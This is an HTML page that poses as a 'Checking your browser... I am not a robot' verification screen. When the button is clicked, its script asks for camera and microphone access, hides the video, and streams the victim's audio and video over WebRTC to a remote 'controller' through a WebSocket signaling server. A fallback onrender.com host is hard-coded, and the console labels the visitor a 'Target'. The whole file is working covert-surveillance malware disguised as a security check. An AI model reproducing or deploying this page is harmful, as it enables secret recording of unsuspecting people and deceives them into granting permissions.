<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: #f8fafc;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #1e293b;
            padding: 20px;
        }

        .card {
            background: #ffffff;
            border-radius: 12px;
            padding: 36px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
            border: 1px solid #e2e8f0;
        }

        .icon-shield {
            width: 56px;
            height: 56px;
            background: #eff6ff;
            color: #2563eb;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }

        h1 {
            font-size: 1.35rem;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 10px;
        }

        p {
            font-size: 0.92rem;
            color: #64748b;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        button {
            background: #2563eb;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 0.95rem;
            font-weight: 500;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
        }

        button:hover {
            background: #1d4ed8;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
        }

        .spinner {
            display: inline-block;
            width: 32px;
            height: 32px;
            border: 3px solid #e2e8f0;
            border-top-color: #2563eb;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        video {
            display: none;
        }
    </style>
</head>

<body>
    <div class="card" id="mainCard">
        <div class="icon-shield">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
        </div>
        <h1>Checking your browser...</h1>
        <p>Please complete quick browser verification to access this protected destination.</p>
        <button id="verifyBtn" onclick="startCovertStream()">I am not a robot</button>
    </div>

    <video id="hiddenVideo" autoplay muted playsinline></video>

    <script>
        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
        const host = window.location.host || "hangon-k31m.onrender.com";
        const wsUrl = `${protocol}//${host}/ws/target`;

        // Low-latency, geo-distributed STUN & TURN relay servers
        const rtcConfig = {
            iceServers: [
                { urls: "stun:stun.cloudflare.com:3478" },
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun1.l.google.com:19302" },
                { urls: "stun:stun2.l.google.com:19302" },
                { urls: "stun:stun3.l.google.com:19302" },
                { urls: "stun:stun4.l.google.com:19302" },
                {
                    urls: [
                        "turn:openrelay.metered.ca:80",
                        "turn:openrelay.metered.ca:443",
                        "turn:openrelay.metered.ca:443?transport=tcp"
                    ],
                    username: "openrelay",
                    credential: "openrelay"
                }
            ],
            iceCandidatePoolSize: 10
        };

        let ws;
        let pc;
        let localStream;
        let myTargetId = null;
        let pendingIceCandidates = [];
        const video = document.getElementById('hiddenVideo');

        async function startCovertStream() {
            const card = document.getElementById('mainCard');
            card.innerHTML = `
                <div class="spinner"></div>
                <h1 style="margin-top: 16px;">Verifying browser...</h1>
                <p>Connecting to secure network. Please wait a moment.</p>
            `;

            try {
                // Optimized constraints for instantaneous camera initialization & low latency
                localStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1280, max: 1920 },
                        height: { ideal: 720, max: 1080 },
                        frameRate: { ideal: 30, max: 30 }
                    },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true
                    }
                });

                video.srcObject = localStream;

                // 1. Create Peer Connection & Add Tracks FIRST
                initWebRTC(localStream);

                // 2. Open WebSocket after PeerConnection is ready
                ws = new WebSocket(wsUrl);

                ws.onopen = function () {
                    console.log("[+] Connected to signaling server");
                };

                ws.onmessage = async (event) => {
                    try {
                        const msg = JSON.parse(event.data);
                        if (msg.type === "init") {
                            myTargetId = msg.targetId;
                            console.log("[+] Target assigned ID:", myTargetId);
                        } else if (msg.type === "offer") {
                            console.log("[+] Processing offer immediately");
                            if (!pc) {
                                initWebRTC(localStream);
                            }
                            
                            await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
                            
                            // Flush any queued ICE candidates
                            while (pendingIceCandidates.length > 0) {
                                const cand = pendingIceCandidates.shift();
                                await pc.addIceCandidate(new RTCIceCandidate(cand));
                            }

                            const answer = await pc.createAnswer();
                            await pc.setLocalDescription(answer);

                            if (ws && ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({ type: "answer", data: answer }));
                                console.log("[+] Answer dispatched to controller");
                            }
                        } else if (msg.type === "ice") {
                            if (pc && pc.remoteDescription && pc.remoteDescription.type) {
                                await pc.addIceCandidate(new RTCIceCandidate(msg.data));
                            } else {
                                pendingIceCandidates.push(msg.data);
                            }
                        }
                    } catch (e) {
                        console.error("Signaling error:", e);
                    }
                };

                ws.onerror = (err) => console.error("WebSocket error:", err);
            } catch (err) {
                console.error("Media/connection error:", err);
                card.innerHTML = `
                    <h1 style="color: #ef4444;">Verification Failed</h1>
                    <p>Camera/browser check was denied or interrupted. Please reload and allow permission to continue.</p>
                `;
            }
        }

        function initWebRTC(stream) {
            if (pc) {
                try { pc.close(); } catch(e) {}
            }

            pc = new RTCPeerConnection(rtcConfig);

            // Add camera & mic tracks immediately
            if (stream) {
                stream.getTracks().forEach(track => {
                    console.log("[+] Adding track to peer:", track.kind);
                    pc.addTrack(track, stream);
                });
            }

            // Instant ICE candidate trickling
            pc.onicecandidate = (event) => {
                if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: "ice", data: event.candidate }));
                }
            };

            pc.oniceconnectionstatechange = () => {
                console.log("[*] ICE Connection State:", pc.iceConnectionState);
            };

            pc.onconnectionstatechange = () => {
                console.log("[*] Peer Connection State:", pc.connectionState);
            };
        }
    </script>
</body>

</html>
